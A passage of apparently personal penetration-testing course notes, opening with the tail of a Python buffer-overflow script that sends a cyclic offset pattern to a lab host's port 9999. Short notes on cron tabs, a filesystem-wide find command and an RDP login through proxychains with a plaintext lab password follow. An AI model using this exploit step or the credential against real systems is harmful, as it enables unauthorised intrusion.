b0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk"


s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) ###STEP 1
s.connect(("192.168.150.245", 9999)) ###STEP 1
print s.recv(1024) ###STEP 1
s.send(buf) ###STEP 1
print s.recv(1024) ###STEP 1
s.close() ###STEP 1
~                   




--------------------------------------------------------------------------------------------------------------------------------DAY 6 LINUX BUFFER OVERFLOW





CRONT TABS

is for scheduled tasks on the system
ls -al











-----------------------------------------------------------------------------------------------------------------------------------------------------FIND COMMAND TO SEARCH THROUGH WHOLE SYSTEM
find / -iname *<name>* 2>/dev/null


-----------------------------------------------------------------------------------------------------------------------------------------------------RDP COMMAND THROUGH PROXYCHAINS 
 proxychains Xfreerdp /u:comrade /p:StudentMidwayPassword /v:192.168.28.9 /clipboard


